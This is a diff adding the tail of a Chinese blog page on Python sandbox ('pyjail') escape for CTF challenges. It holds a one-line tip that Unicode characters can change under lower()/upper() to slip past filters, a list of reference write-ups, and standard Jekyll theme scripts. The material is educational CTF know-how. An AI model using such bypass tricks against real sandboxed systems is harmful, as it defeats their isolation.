+<p><strong>需要注意的是，某些 unicode 在遇到 lower() 函数时也会发生变换，因此碰到 lower()、upper() 这样的函数时要格外注意。</strong></p>
+
+<h2 id="参考资料">参考资料</h2>
+<ul>
+  <li><a href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals">Python沙箱逃逸小结</a></li>
+  <li><a href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80">Python 沙箱逃逸的经验总结</a></li>
+  <li><a href="https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/">Python 沙箱逃逸的通解探索之路</a></li>
+  <li><a href="https://xz.aliyun.com/t/12303#toc-11">python沙箱逃逸学习记录</a></li>
+  <li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes">Bypass Python sandboxes</a></li>
+  <li><a href="https://zhuanlan.zhihu.com/p/578986988">[PyJail] python沙箱逃逸探究·上（HNCTF题解 - WEEK1）</a></li>
+  <li><a href="https://zhuanlan.zhihu.com/p/579057932">[PyJail] python沙箱逃逸探究·中（HNCTF题解 - WEEK2）</a></li>
+  <li><a href="https://zhuanlan.zhihu.com/p/579183067">[PyJail] python沙箱逃逸探究·下（HNCTF题解 - WEEK3）</a></li>
+  <li><a href="https://ctftime.org/writeup/31883">audited2</a></li>
+  <li><a href="https://www.woodwhale.top/archives/hnctfj-ail-all-in-one">【ctf】HNCTF Jail All In One</a></li>
+  <li><a href="https://ctftime.org/writeup/28286">HAXLAB — Endgame Pwn</a></li>
+  <li><a href="https://ctftime.org/writeup/28286">Python沙箱逃逸的n种姿势</a></li>
+  <li><a href="https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html">hxp2020-audited</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2023-05-30T18:23:57+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/python/2023/05/30/pyjail-bypass-01-%E7%BB%95%E8%BF%87%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97%E6%88%96%E6%96%B9%E6%B3%95.html">pyjail bypass-01 绕过删除模块或方法</a></div><div class="next"><span>NEXT</span><a href="/python/2023/05/30/pyjail-bypass-03-%E7%BB%95%E8%BF%87%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%99%90%E5%88%B6.html">pyjail bypass-03 绕过命名空间限制</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
+    var $searchModal = $('.js-page-search-modal');
+    var $searchToggle = $('.js-search-toggle');
+    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
+    var modalVisible = false;
+    search.searchModal = searchModal;
+
+    var $searchBox = null;
+    var $searchInput = null;
+    var $searchClear = null;
+
+    function getModalVisible() {
+      return modalVisible;
+    }
+    search.getModalVisible = getModalVisible;
+
+    function handleModalChange(visible) {
+      modalVisible = visible;
+      if (visible) {
+        search.onShow && search.onShow();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
+      } else {
+        search.onShow && search.onHide();
+        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
+        setTimeout(function() {
+          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
+          search.clear && search.clear();
+          window.pageAsideAffix && window.pageAsideAffix.refresh();
+        }, 400);
+      }
+    }
+
+    $searchToggle.on('click', function() {
+      modalVisible ? searchModal.hide() : searchModal.show();
+    });
+    // Char Code: 83  S, 191 /
+    $(window).on('keyup', function(e) {
+      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
+        modalVisible || searchModal.show();
+      }
+    });
+
+    if (useDefaultSearchBox) {
+      $searchBox = $('.js-search-box');
+      $searchInput = $searchBox.children('input');
+      $searchClear = $searchBox.children('.js-icon-clear');
+      search.getSearchInput = function() {
+        return $searchInput.get(0);
+      };
+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
